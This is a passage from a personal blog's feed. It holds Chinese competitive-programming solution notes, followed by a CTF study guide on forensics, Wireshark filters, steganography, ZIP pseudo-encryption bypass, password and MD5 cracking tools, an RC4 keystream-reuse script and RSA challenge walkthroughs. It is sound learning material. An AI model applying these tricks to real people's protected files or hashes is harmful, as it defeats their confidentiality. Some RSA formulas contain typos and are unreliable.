id="P1983"><a href="https://www.luogu.com.cn/problem/P1983">P1983</a></h2><p>碰到什么高于什么,联想图论建模和差分约束.</p><p>连边进行拓扑排序分层(找最长链).</p><h2 id="P9211"><a href="https://www.luogu.com.cn/problem/P9211">P9211</a></h2><p>随机化神仙题.</p><p>我们发现,原字符串只会有 $1%$ 的字符会错,而且对你的容错率有足足 $3%$ ,检查没有什么很特殊的性质,考虑随机化.<br>随机化的步骤是:枚举 <strong>所有长度</strong> ,对所有长度随机 $500$ 个位置,假如说这个长度是对的,那么错误字符概率应该期望占比 $1%$ 左右.<br>所以要对长度随机,最后匹配最多的长度会进行深度匹配,也就是遍历所有位置取最大的那个字符.</p><p>笔者本来以为是对长度随机化,所以shuffle了一下就开始深度匹配了,复杂度假的一批…</p><h2 id="P2893"><a href="https://www.luogu.com.cn/problem/P2893">P2893</a></h2><p>给一个序列,你可以把任意数字变大或变小,代价就是差的绝对值,问你把原数组变成单调不减或单调不增的数列的最小代价?</p><p>非常典的题,有很多变式(六倍经验…).<br>首先有一个结论是,当原数组单调的时候,所取值一定在原数组出现过.</p><p>设dpij表示第i个元素取第j个值,i之前元素满足单调的最小代价,有$$dp_{ij}=\min(dp_{i-1,k}+abs(dat_i-val_j)),k\le j$$注意到后半部分是不随k变化的,所以提出来:$$dp_{ij}=\min(dp_{i-1,k})+abs(dat_i-val_j),k\le j$$整一个前缀min就完事了.</p><p>变式1:变成单调不降时最少动多少个元素? $n-LIS$ .</p><p>变式2:变成单调 <strong>递增</strong> 的最小代价?<br>把原数组变为 $dat_i-i\to dat_i$ 然后再跑上面的,意思是我们已经扣掉了增益,然后直接加上就可以了.</p><p>变式3:数据放大(想一个nlogn的做法):<br>(下面都在分析非下降数列)<br>根据贪心的原则,假如说当前有一个数字x,后面来了一个y,假如y不比x小,那么直接加入即可.<br>否则一定x变小或者y变大或者两者都有,但是这个和是一定的.所以显然是取更小的那个更优,于是加上abs之后把顶端max元素弹出,加入两个小的y.<br>贪心nlog即可.</p><h2 id="计数转01-计数视频">计数转01 <a href="https://www.bilibili.com/video/BV1BHtmzDEgL">计数视频</a></h2><p>给一个0-(n-1)的排列,q次询问,每次询问区间[l,r]上所有子区间的mex和.</p><p>考虑转化计数方法:对于i=1~n询问即为区间上有多少个子区间满足mex&gt;=i,只需要枚举mex即可(也就是说012这个区间会因为存在0+1,存在01+1,存在012+1,答案是3)</p><p>枚举0~i出现的最左端left(i)和最右端right(i),对于整个区间的贡献即为(left(i)-l+1)*(r-right(i)+1),也就是必须包含这个小的区间,拆开式子得到$$ans=left(i)\times r-left(i)\times right(i)+left(i)-l\times r-right(i)+1$$使用前缀和优化即可,对于一个区间二分查出最大的子区间left(i)和right(i)被包含的.</p><h2 id="计数转01-2-HihoCoder-1646">计数转01 2 HihoCoder-1646</h2><p>有 $n$ 个包含 01? 的串，每个串的 ? 可以填成 0/1。求在所有情况下把这些串插入字典树得到的树的大小的和。<br>$n \leq 20,|S| \leq 50$。</p><p><strong>字典树大小</strong> 这个东西很难刻画。<br>我们使用经典等价转换：字典树大小等价于本质不同前缀个数，也就是所有串前缀的并。</p><p>于是用容斥计算：$\sum_S (-1)^{|S|-1} LCP(S)$。<br>(用人话说:枚举所有n个字符串的子集,|S|表示枚举的子集大小.LCP(S)的意思是枚举的字符串这里面的公共前缀有多少个)</p><p>直接状压n暴力check即可, $O(2^nn|S_i|)$ ,如果使用集合合并的神秘科技可以优化到 $O(2^n|S_i|)$ ,其中S_i是字符串最大长度.</p><h2 id="计数转概率-AGC030d">计数转概率 AGC030d</h2><p>直接枚举是会爆表的,尝试转成概率:每次有1/2的概率进行操作,最后的答案就是期望乘上2^q种情况.</p><p>设fij表示i位置数字大于j位置数字的概率,一次交换只会影响xy直接比较的元素,所以有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f[x][y]=f[y][x]=<span class="built_in">v</span>(f[x][y],f[y][x]);</span><br><span class="line"><span class="function"><span class="keyword">for</span> j in <span class="title">range</span><span class="params">(<span class="number">1</span>,n+<span class="number">1</span>)</span>:</span></span><br><span class="line"><span class="function">f[x][j]=</span>f[y][j]=<span class="built_in">v</span>(f[x][j],f[y][j]);</span><br><span class="line">f[j][x]=f[j][y]=<span class="built_in">v</span>(f[j][x],f[j][y]);</span><br></pre></td></tr></table></figure><p>最后直接相加再乘上情况数即可.</p><h2 id="计数转概率2-HDU-5396">计数转概率2 HDU-5396</h2><p>有一个表达式，长的是这样：$n$ 个数 $a_1,a_2,…,a_n$，每两个数之间有一个操作符号。每次可以选择一个操作符运算，直到只剩一个数，这个数就是表达式的结果。问所有情况下最后的数的和。 $n \leq 500$</p><p>我们还是考虑转期望。令 $f_{l,r}$ 表示 $[l,r]$ 的答案。那么显然有转移 $f_{l,r}=\frac{1}{r-l}\sum_{k=l}^{r-1} v(f_{l,k},f_{k+1,r},opt_k)$，$v(x,y,opt)$ 表示 $x\ opt\ y$ 的结果。</p><p>最后答案即为 $f_{1,n} \times (n-1)!$。</p><h2 id="P4424"><a href="https://www.luogu.com.cn/problem/P4424">P4424</a></h2><p>神秘找规律题.</p><blockquote><p>对于两个数ab,假设0是或,1是与,从a的低位按照b的低位二进制进行运算(a开头补0),结果等于 $a&gt;b$ .例如 <code>a=0001</code> , <code>b=0010</code> ,运算结果 <code>0|0|0&amp;0|1=1</code> ,直接比较 <code>a&gt;b</code> 也是1(ab高位在右,按照字符串规则去看)</p></blockquote><h2 id="P5339"><a href="https://www.luogu.com.cn/problem/P5339">P5339</a></h2><p>很棒的组合数学题,补齐了板子…</p><p>在这里有结论:假设有四种颜色,每种颜色分别能涂abcd个格子,问你在长度为n的格子上有多少种涂颜色的方案.<br>考虑EGF(EGF卷积的意义就是随意插入混合),把这四个卷积起来最后取第n项就是答案.</p><p>实际卷的时候有一个事情:lim是比abcd和大的第一个2的幂,以及,abcd在做完NTT之后可以直接乘一起取模,然后再做FNTT.</p><h2 id="abc306g">[abc306g]</h2><p>神秘题.问你能否在一张图上走很大步回到原点.</p><p>找环:考虑这些环大小的gcd是数字的倍数,建立正图反图,进行dfs,统计正图深度(反图用于统计谁可以到达原点,否则整这个环是无意义的.)</p><p>然后进行环大小的统计:对于环大小有一个结论:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">abs</span>(dep[i]+<span class="number">1</span>-dep[j])</span><br></pre></td></tr></table></figure><p>使用情景:对于任意正整数a,图上存在一个包含1点的,长度不是a倍数的环的充要条件是对于有向边ij满足深度在上面的式子.可以理解为环上从a到b可以正着走也可以反着走环,所以环的大小被&quot;拼出来&quot;.</p><h2 id="arc185a"><a href="https://atcoder.jp/contests/arc185/tasks/arc185_a">arc185a</a></h2><p>神秘题,看了五分钟不知道怎么写…</p><p>最后还是看题解了,题解说每个人分别有n张牌(草,读假题了,我还以为一共n张牌呢)<br>题解说对于牌一致的情况,在剩最后一张牌前,一定不会输.<br>同时Alice赢面很大,要考虑Alice出完牌Bob剩一张牌的时候Alice会不会输.</p><h2 id="P9318"><a href="https://www.luogu.com.cn/problem/P9318">P9318</a></h2><p>一道手动分治的题…<br>对于某些数据范围,采取不同的做法…乐…</p><p>题面:给你一个乐高墙,长w高h,你有两种方块,是1x1和1x2(高x长),你要用这两种方块铺满整个强,但是要求墙必须是坚固的(也就是相邻两个&quot;柱子&quot;之间必须至少有一个1x2连接在其中),问有多少种方案.</p><p>首先考虑朴素的dp:dp[i][j]表示第i行有j个突起的情况数,有:$$dp_{1,i}=\binom mi$$$$dp_{i,j}=\sum_{k=1}^mdp_{i-1,k}\times\binom{m-k}j$$$$ans=\sum_{i=1}^{m}dp_{n-1,i}$$复杂度O(nm^2).过不去全部数据,考虑其他方案:<br>设dp[i]表示列数为m情况下有n行满足锁死的情况数,f[i]表示i行m列随便选的情况数,我们首先求出所有情况,再通过枚举&quot;中间线&quot;,强制左边锁死,右边随便,整栋墙就是不满足的,所以容斥减掉.$$dp_i=f_i^m-\sum_{j=1}^{i-1}f_{i-j}^mdp_{j}$$$$ans=dp_n$$时间复杂度O(n^2).<br>此时需要我们手动均衡两种复杂度,均摊一下复杂度是 $O((nm)^{\frac43})$ …</p><h2 id="神秘小式子">神秘小式子</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a|b=a^b^(a&amp;b)</span><br><span class="line">a|b=a+b-(a&amp;b)</span><br></pre></td></tr></table></figure><h2 id="CF2136F1">CF2136F1</h2><p>神秘交互题.首先全部填1能得到 $\lfloor\frac xn\rfloor$ ,然后考虑设计一个能够区分[1,n/2]的办法.</p><p>答案居然是构造 $[l,1,l,2,…,l,r]$ 这个能测出来,太惊讶了.</p><h2 id="CF696F">CF696F</h2><p>对于一个数组a,每次能选择一个两个元素并插一个平均数(整数)进去.直到这个数组再也不能插入数字结束,如果最后的数组是一个公差1的等差数列那么就是&quot;好&quot;的.<br>现在给你一个数列n,你要求出有多少个连续子数组是&quot;好&quot;的.</p><p>非常妙的题.<br>首先发现公差绝对不是偶数,因为能再插一个数.<br>然后发现公差实际上是选出来的数两两差值的gcd.</p><p>由于gcd在固定左端点时右端点的区间gcd是单调的,所以我们需要找到最左端的值,满足区间gcd是2的倍数.<br>相同数字会导致区间在check时出现(可以-不可以-可以)的局面,所以我们初始时应当排除掉相同数字做差出0的局面,也就是第二次二分得到最左端连续的数字.</p><p>具体地:使用线段树的复杂度是建树nlog,查询log^2.<br>而使用st表则是建表nlog^2查询log(左端点和右端点取一个gcd就可以了)</p><h2 id="CF2120D">CF2120D</h2><p>给你一个矩阵的size,和元素的种类数,你需要确定一个最小的矩阵,满足矩阵内元素在最坏情况下填数,但是你按行按列删除后,最后剩下的元素完全一致的子矩阵的大小不小于给定的axb.</p><p>比如给定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 1         1 1           1 1</span><br><span class="line">4 5 6    =&gt;   4 6      =&gt;   1 1</span><br><span class="line">1 8 1         1 1</span><br></pre></td></tr></table></figure><p>最后能删成的矩阵大小是2x2.<br>你要在保证行最小的前提下最小化列,输出答案.</p><p>神秘抽屉原理题.首先保证n行最小答案就是 k(a-1)+1 .<br>考虑什么时候m最小,首先最坏条件下m是一个上界.<br>我们考虑这个抽屉是多大的:可行的元素种类是从n行中选a行我们想要的,而且这个想要的是k种取值,答案就是k*C(n,a).<br>那么我们让这些元素有一种至少出现b次就是 k*C(n,a)*(n-1)+1.</p><h2 id="CF2066C">CF2066C</h2><p>给你一个数列,你有三个寄存器PQR,你要从头开始,每次必须选择寄存器的一个抑或上数列第i项,你必须随时保证存在PQR中两个的数字相等,问你有多少种操作方式(某次操作选了不同的寄存器就被视作不同操作.)</p><p>神秘题.<br>因为PQR三个数必须抑或上a,所以任何时刻的P^Q^R都等于前缀抑或.<br>而且任意时刻有两个数相等,那么一定有一个数的值就是前缀抑或.<br>考虑dp:设 $dp_{i,j}$ 表示前i项,有一个数字是pre[i],剩下两个数字为j时候的答案,假如j=pre[i-1],那么随便选一个抑或就可以了,有 $dp_{i,pre[i]}\leftarrow 3dp_{i-1,pre[i-1]}$ ,假如j=pre[i],同理…</p><h3 id="严正声明-在cf能少用umap就少用-又被卡了…">严正声明:在cf能少用umap就少用!!!又被卡了…</h3><h2 id="Even-Circuit"><a href="https://qoj.ac/contest/2506/problem/14019">Even Circuit</a></h2><p>根据鸽巢定理…搜索范围不会超过值域上限…<br>所以这是个诈骗题,直接搜索就可以了…但是还得加一个优化:从2e5的数组里面选很少个,应该枚举下一个选的位置,而不是记录总数量以及当前选不选.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> num,<span class="type">int</span> res,<span class="type">int</span> xx)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(ff==<span class="number">1</span>)<span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(res&lt;=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(vis[xx]!=<span class="number">0</span>)&#123;</span><br><span class="line">ff=<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">vis[xx]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num&gt;n)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=num;i&lt;=n;++i)&#123;</span><br><span class="line"><span class="built_in">dfs</span>(i+<span class="number">1</span>,res<span class="number">-1</span>,xx^dat[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dfs(num+1,res-1,xx^dat[num]);</span></span><br><span class="line"><span class="comment">// dfs(num+1,res,xx);//用上面的别用下面的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Adjacent-Add"><a href="https://qoj.ac/problem/14016">Adjacent Add</a></h2><p>给你一个数组.每次操作可以在ai加上x(可以为负),ai+1加上kx(k给定),问你任意操作后数组能不能变成一样的.</p><p>观察不变量:$$C = A_1 - \frac{1}{K}A_2 + \frac{1}{K^2} A_3 + \dots + \left(-\frac{1}{K}\right)^{N-1} A_N$$当整个数组相等时,长这样:$$C = x - \frac{1}{K} x + \frac{1}{K^2} x + \dots + \left(-\frac{1}{K}\right)^{N-1} x$$所以我们直接用两个式子相减,然后尽可能贴近这个值附近检查整数x是不是解就行了.</p><p>对于一个x:检查是不是解的时候可以用发散性正着检查,也可以用能否整除以及最后是不是x倒着检查.(经检验[-20~20]区间能过)</p><h2 id="Yelkrab"><a href="https://qoj.ac/contest/1885/problem/9921">Yelkrab</a></h2><p>放到字典树上,维护ans数组表示在队伍为j时的答案.<br>发现一个字典树节点sz++的时候只会对其所有因子产生贡献.<br>所以枚举因子暴力维护即可.</p><h2 id="Flipping-Paths"><a href="https://qoj.ac/contest/1885/problem/9926">Flipping Paths</a></h2><p>呃…首先,斜着的横行的W或者B奇偶性一致的时候就有解.<br>然后考虑贪心,每次取最下方的元素构造一条路径走过去即可.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;美好的新赛季从补题开始.&lt;/p&gt;
&lt;h1&gt;pre&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;小心 $n$ 和 $m$ 写反.&lt;/li&gt;
&lt;li&gt;注意数组不要开小或开大.&lt;/li&gt;
&lt;li&gt;注意计算变量范围,不要能到 &lt;code&gt;long long&lt;/code&gt; 的变量开 &lt;code&gt;in</summary>
      
    
    
    
    <category term="ACM" scheme="https://narafluorine.github.io/categories/ACM/"/>
    
    
    <category term="Contest" scheme="https://narafluorine.github.io/tags/Contest/"/>
    
  </entry>
  
  <entry>
    <title>CTF</title>
    <link href="https://narafluorine.github.io/2024/11/04/20008_CTF/"/>
    <id>https://narafluorine.github.io/2024/11/04/20008_CTF/</id>
    <published>2024-11-04T04:27:36.000Z</published>
    <updated>2025-12-18T18:24:35.148Z</updated>
    
    <content type="html"><![CDATA[<h1>Kali</h1><p>打CTF的都不好意思说自己不会用Linux…</p><h2 id="共享文件夹">共享文件夹</h2><p><a href="https://zhuanlan.zhihu.com/p/677780893">这个</a><br>地址 <code>/mnt/hgfs/LinuxShare</code></p><h1>MISC</h1><h2 id="Google">Google</h2><ol><li><code>&quot;aaa&quot;</code> 必须出现的词汇</li><li><code>site:aaa.com</code> 只搜索这个网站的结果</li><li><code>-aaa</code> 结果不出现某个词汇</li><li><code>imagesize:500x500</code> 只搜索这么大的图片(像素)</li><li><code>filetype:pdf</code> 只搜索pdf格式的文档</li><li><code>*</code> 通配符,不确定这个位置填啥可以写</li><li><code>aaa or bbb</code> <code>aaa and bbb</code> 返回包含两个词任何一个或者都包含的结果</li><li><code>BEFORE:1999</code> <code>AFTER:1999</code> <code>1999..2000</code> 查询指定年份的材料</li><li><code>related:aaa.com</code> 查询相关的网站</li><li><code>cache:aaa.com</code> 返回这个网站的缓存版本</li></ol><h2 id="Webs">Webs</h2><p><strong>编码</strong>:<br><a href="https://www.cnblogs.com/ruoli-s/p/14206145.html">CTF常见编码</a><br><a href="http://www.hiencode.com/">CTF在线工具1</a><br><a href="https://ctf.bugku.com/tools">CTF在线工具2</a></p><p><strong>取证</strong>:<br>硬盘镜像取证⼯具 FTK Imager AutoPsy<br>内存镜像取证⼯具 Volatility<br>加密容器⼯具 Veracrypt<br>各⼤国内取证技术提供商的⼯具<br><a href="https://forensics.xidian.edu.cn/">取证相关</a></p><p><strong>流量分析</strong>:<br><a href="https://www.jianshu.com/p/9b9438dff7a2">OSI七层模型</a><br><a href="https://blog.supersassw.com/p/ctf-note-misc_3/">流量分析入门</a><br><a href="https://www.cnblogs.com/mq0036/p/11187138.html">Wireshark使用</a></p><h2 id="属性">属性</h2><p>右键查看属性有时候能得到意外之喜…</p><h2 id="rtf">rtf</h2><p><code>7B 5C 72 74 66</code> 是 <code>&#123;\rtf</code> .</p><h2 id="gif">gif</h2><p><code>GIF8(47 49 36 38)</code> 是gif文件头,之后常接 <code>9a(39 61)</code> ,注意看提示.</p><p>powershell和cmd不是一个东西…<br>在cmd中拼合文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.bin + b.bin + c.bin res.bin</span><br></pre></td></tr></table></figure><h2 id="binwalk">binwalk</h2><p>binwalk可以自动检查文件里面杂糅什么文件.</p><p><code>binwalk -e a.xx</code> 则可以直接分离这些文件,根本不用自己查.</p><h2 id="ZIP伪加密">ZIP伪加密</h2><p>ZIP文件格式有两种,其加密标志位分别在不同的位置:</p><p><code>50 4B 01 02 xx xx xx xx 01 08</code> :目录区加密,只需要管 <code>01</code> 改成偶数就行了, <code>08</code> 记录额外信息(不用管).<br><code>50 4B 03 04 xx xx 00 00</code> :局部文件加密标记,仍然是前半部分是偶数表示未加密.<br><code>78 9C AD 50</code> 是Zlib文件的开头编码.</p><p>友情提示,zlib文件(gz)Win可以用cyberchef解压.<br>同时,部分linux自带binwalk.</p><h2 id="傅里叶盲水印">傅里叶盲水印</h2><h2 id="Wireshark">Wireshark</h2><p>抓包软件.</p><p><code>http contains &quot;POST&quot;</code> 搜索内容有 <code>POST</code> 的所有包.<br><code>http.request.method==POST</code> 也可以查找包<br><code>ip.addr==x.x.x.x</code> 查找IP是xxxx的包<br><code>tcp.port==80</code> 查找端口为80的包<br><code>http</code> 过滤所有http协议的包</p><p><code>analysis:Follow TCP stream</code> 是对数据流的分析然后整合成一个完整信息的过程.</p><p><code>ftp</code> 显示所有ftp协议的流.<br><code>ftp-data</code> 显示文件数据(对其追踪能够找到下载了什么)<br><strong>特别注意</strong> :追踪数据流的时候一定要选原始数据另存为,否则会存成hex格式导致打不开文件.</p><p><code>foremost</code> 在Kali上面有这个文件可以自动分离 <code>pcapng</code> 的文件.<br>抓包的时候可能碰到url编码和base64一起用的,如 <code>RDpcd2FtcDY0XHd3d1xhZG1pblw%3D</code> ,其中最后的 <code>%3D</code> 是 <code>=</code> .</p><p><code>tcp.stream eq 193</code> 后面的数字可以随意改变,意思是数据流编号(从0-无穷)<br>如果当前追踪流没有想要的结果,不妨换一个流再看(改数字)</p><h2 id="图片宽高改变">图片宽高改变</h2><p>使用脚本破解,原理是CRC校验.</p><p>然而实际上会有非常阴险的出题人连着图片的CRC一起改,导致直接改变宽高不会有任何提示.<br>这个时候推荐手动改变宽高然后丢进一个不管CRC的软件里查看图片,如 <strong>画图</strong> .<br>看起来一张图片宽度改错了整张图片都会崩,但是如果高度改变了,在画图中只会被表示为透明.</p><h2 id="F5隐写">F5隐写</h2><p>因为这个包用的jdk11,而Flu电脑上装的是jdk17…</p><p><code>&amp; &quot;C:\Program Files\Java\jdk-11.0.2\bin\java.exe&quot; -classpath . Extract 文件绝对路径</code></p><h2 id="png补齐IDAT">png补齐IDAT</h2><p>原理还是CRC校验,使用 <code>pngcheck.exe -v target.png</code> 自动检查计算CRC值是否正确.(Flu做的题里面是把IDAT改成IOAT然后再改图片高度让图片缺了一块,要靠自己补齐,)</p><h2 id="文件夹带私货">文件夹带私货</h2><p>出现文本 <code>xx,txt</code> , <code>PK</code> 值有可能是zip压缩包(zip的创始人名字简写为PK),改拓展名,如果有密码就暴力破解.</p><h2 id="LSB图像隐写">LSB图像隐写</h2><p>因为很多颜色人是分辨不出来的,所以可以使用rgb颜色最低位进行隐写,隐藏信息或者加隐形水印.拉高对比度会显出原形.</p><h1>Crypto</h1><h2 id="Webs-2">Webs</h2><p><a href="https://shal10w.github.io/">大佬博客1</a><br><a href="https://d33b4t0.com/">大佬博客2</a></p><p><a href="https://tool.bugku.com/jiemi/">解密网站</a></p><h2 id="数论基础">数论基础</h2><h3 id="勒让德符号">勒让德符号</h3><p>$$\left(\frac ap\right)=a^{(p-1)/2}\mod p$$意义:判断一个数字是不是模 $p$ 的二次剩余(是1不是p-1(模意义下的-1))0表示a是p的倍数.</p><h3 id="二次剩余的性质">二次剩余的性质</h3><p><code>Quadratic Residue</code> 是二次剩余根, <code>Quadratic Non-residue</code> 表示非二次剩余数字.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Quadratic Residue * Quadratic Residue = Quadratic Residue</span><br><span class="line">Quadratic Residue * Quadratic Non-residue = Quadratic Non-residue</span><br><span class="line">Quadratic Non-residue * Quadratic Non-residue = Quadratic Residue</span><br></pre></td></tr></table></figure><h3 id="勒让德符号中质数的性质">勒让德符号中质数的性质</h3><p>$$\left(\frac{-1}p\right)=\begin{cases}1&amp;p\equiv1\mod4\\-1&amp;p\equiv3\mod4\end{cases}$$$$\left(\frac{2}p\right)=\begin{cases}1&amp;p\equiv\pm1\mod8\\-1&amp;p\equiv\pm3\mod8\end{cases}$$这个符号是完全积性函数.</p><h2 id="RC4">RC4</h2><p>一个抑或加密体系,知道一个明文和相同密钥加密得到的密文可以还原另一条明文:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">msg = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ct1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">ct2 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 计算密钥流：keystream = msg XOR ct2</span></span><br><span class="line">keystream = <span class="built_in">bytes</span>([m ^ c <span class="keyword">for</span> m, c <span class="keyword">in</span> <span class="built_in">zip</span>(msg, ct2)])</span><br><span class="line"><span class="comment"># 使用密钥流的前37字节解密ct1得到flag</span></span><br><span class="line">flag = <span class="built_in">bytes</span>([c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(ct1, keystream)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="常见编码">常见编码</h2><p><a href="https://hackliu.com/?p=245">密码总结1</a></p><p>旗语 中文注音符号 25对色码 维吉尼亚密码(凯撒密码+密钥) 棋盘密码 ASCII<br>仓颉码 五笔 四角号码 郑码 中日韩统一表意文字(和制汉字 韩制汉字,“国字”)<br>adfgx密码</p><p>阴阳怪气编码 喵喵喵语(原理是零度等宽字符编码)</p><p><a href="https://hanzi.unihan.com.cn/GanZhi/Index/">干支纪年法</a><br><a href="http://code.mcdvisa.com/">中文电码</a><br><a href="https://asecuritysite.com/cipher/code_sms">SMS Cipher</a>几个1-8之内的数字<br><a href="https://quipqiup.com/">Q单词表爆破</a><br><a href="http://web.chacuo.net/charsetuuencode">UUencode</a>,示例 <code>89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</code><br><a href="https://www.toolkk.com/tools/jjencode-encode-decode">JJencode</a><br><a href="https://www.toolhelper.cn/EncodeDecode/QuotedPrintable">Quoted-Printable</a><br><a href="https://www.sojson.com/encrypt_rabbit.html">Rabbit加密</a>(CyberChef上的这个巨难使,-1,别用)据说好像是U2开头<br><a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">Rot47加密</a>所有字母ascii都在33-126范围<br><a href="https://www.metools.info/code/playfair_186.html">playfair加密</a>关键词&quot;公平&quot;<br><a href="https://www.guballa.de/vigenere-solver">vigenere维吉尼亚密码</a><br><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a><br><a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a> 并没有链接,为什么这种编码算法还能爆炸的…<br><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码 fence</a><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">凯撒密码</a></p><p>碰到 <code>1745347988</code> 这种很大的而且以 <code>174</code> 开头的数字考虑时间.<br>碰到32位字母加数字联想md5,然后<a href="https://cmd5.com">爆破</a>(.hash结尾的更说明了一切)<br>有的时候题目会非常意识流,记得先看这个数字是几进制的,然后用 <code>int('114514',5)</code> 恢复真正的十进制n.<br>然后当题目不给n的时候要猜测e不大.<br>碰到两个近乎完全相同的字符串要考虑表映射关系(python里面中文是一个字一个地址,好评)</p><h2 id="ASCII">ASCII</h2><p>注意,ascii编码范围在0-127之间,碰到奇怪的进制可以尝试使用按照ascii值域分组整除密码.<br>看到一堆有超过127的可以考虑整体下移几个数字(rot操作)</p><h2 id="base64">base64</h2><p>出现 <code>ABC...Zabc...z+/=</code> 字符集字样联想base64.<br>代码段出现 <code>/3</code> <code>*4</code> 字样联想base64.</p><h2 id="XOR">XOR</h2><p>一定要记住,xor是可以逆反过来的!!!<br>对于确定是xor加密的字符串,可以尝试通过把 <code>flag&#123;</code> 这个前缀输进去反向解出密钥前几位,然后猜后几位(注意在cyberchef记得勾选UTF-8编码的密钥).</p><h2 id="凯撒密码">凯撒密码</h2><p>尝试差值变换(第一个字符差1,第二个字符差2之类的…)</p><h2 id="RSA签名">RSA签名</h2><p>信息使用你<strong>朋友的公钥</strong>加密,信息的哈希用<strong>自己的私钥</strong>加密,然后朋友用自己的私钥和你的公钥解密,得到哈希和原信息,然后比对一下,就叫做签名.</p><h2 id="RSA">RSA</h2><p>PS: <code>int(&quot;FFFF&quot;,16)</code> 能把字符串转成十六进制数字.</p><blockquote><p><code>hex(d)</code> 一个数字转hex,返回0x啥一堆<br>有的时候给出的十六进制前面带前缀 <code>0x</code> 的同时后面会带后缀 <code>L</code> ,做题交flag不对了可以加上试试.</p></blockquote><p>网上有很全的博客,这里讲一些例题</p><h3 id="0-enc-key">0 <code>.enc</code> <code>.key</code></h3><p>碰到这俩凑一对的去找<a href="http://tool.chacuo.net/cryptrsakeyparse">rsa在线公私钥分解</a></p><h3 id="1-e-16">1 e=16</h3><p>从rsa的角度,e和phi不互质,不存在d.<br>但是从二次剩余的角度,e=16意味着可以折半每次得到c^8,c^4,…逐次得到原始信息.</p><h3 id="2-pqrs-但是next-prime">2 pqrs,但是next_prime()</h3><p>题干很吓人:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alpha=<span class="number">8</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p*alpha)</span><br><span class="line">r = gmpy2.next_prime(q*alpha*<span class="number">2</span>)</span><br><span class="line">s = gmpy2.next_prime(r*alpha*<span class="number">4</span>)</span><br><span class="line">n = p**<span class="number">8</span> * q**(<span class="number">16</span>) * r**(<span class="number">32</span>) * s**<span class="number">2</span></span><br></pre></td></tr></table></figure><p>我们发现一个事实:对于一个任意的p,对应的qrs都是确定的.</p><p>所以直接值域二分,比较n大还是小就行了,复杂度O(logn),这个题草过去了.</p><h3 id="3-二项式模">3 二项式模</h3><p>题干:给定$$N=pq$$$$c_1=(2p+3q)^{e_1}\mod N$$$$c_2=(5p+7q)^{e_2}\mod N$$求 $p,q$ .</p><p>通过配平阶数可以得到如下式子:$$c_1^{e^2}=(2p+3q)^{e_1e_2}\mod N$$$$c_2^{e_1}=(5p+7q)^{e_1e_2}\mod N$$因为 $N=pq$ ,所有含pq的都直接忽略:$$c_1^{e^2}=(2p)^{e_1e_2}+(3q)^{e_1e_2}\mod N$$$$c_2^{e_1}=(5p)^{e_1e_2}+(7q)^{e_1e_2}\mod N$$解二元一次方程得到 $p^{e_1e_2}\mod N$ 和  $p^{e_1e_2}\mod N$ .<br>然后求 $\gcd(p^{e_1e_2},N)$ 得到 $p,q$ .</p><h3 id="4-不知道另一半">4 不知道另一半</h3><figure 